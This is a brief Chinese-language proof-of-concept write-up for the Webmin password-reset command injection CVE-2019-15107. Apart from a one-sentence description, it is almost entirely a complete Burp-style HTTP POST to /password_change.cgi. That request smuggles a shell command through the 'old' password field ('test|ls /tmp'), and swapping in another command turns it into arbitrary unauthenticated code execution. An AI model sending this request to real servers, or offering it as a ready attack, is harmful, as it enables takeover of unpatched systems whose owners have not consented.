## webmin 远程命令执行 （CVE-2019-15107）

### 简介

Webmin是功能强大的基于Web的类Unix系统管理工具. 在找回密码页面存在无需权限的命令注入漏洞, 可以执行任意系统命令.

### POC

通过 Burpsuite 发送修改密码的 post 请求, 可以调用系统命令. 

```
POST /password_change.cgi HTTP/1.1
Host: 192.168.128.108:59354
Cookie: redirect=1; testing=1
Content-Length: 65
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://192.168.128.108:59354
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.128.108:59354/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

user=rootxx&pam=&expired=2&old=test|ls /tmp&new1=test2&new2=test2
```

